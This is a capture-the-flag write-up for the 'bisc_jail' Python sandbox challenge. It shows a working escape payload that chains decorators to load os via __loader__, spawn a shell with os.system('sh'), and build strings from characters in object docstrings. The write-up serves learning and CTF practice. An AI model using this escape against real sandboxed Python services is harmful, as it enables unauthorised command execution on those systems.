## bisc_jail

<img src="images/chall.png" width=400>

We are provided with a Pyjail that uses a custom AST for filtering, preventing any function invocations.  

<img src="images/ast.png" width=500>

The jail also implements a pretty simple blacklist, limiting our payload to a restricted character set.  

<img src="images/filter.png" width=600> 

Our payload is run against an `exec()` command in a custom environments, where access to builtins are removed and a custom loader is provided.  

<img src="images/env.png" width=600>

The `exec()` call and the inclusion of `@` in the charset clearly points towards a decorator chaining exploit, so we can craft a basic payload that uses `__loader__` to import `os` and make an `sh` call.    

```python
@(lambda x: x.system)
@__loader__.load_module
@(lambda _: 'os')
def f():0

@f
@(lambda _: 'sh')
def g():0
```

The next step would be to find a way to construct strings, since quotes aren't in the charset.  

Luckily, we can use a pretty standard technique of building strings by grabbing individual characters from an object's documentation. We can then use the `__add__` attribute in conjunction with our previous decorator chaining technique to construct the desired string.  

```python
# os
@().__doc__[34].__add__
@(lambda _:().__doc__[19])
def os():0
```

Putting it all together, we can finally get a shell where we are able to retrieve the flag.  

<img src="images/flag.png" width=600>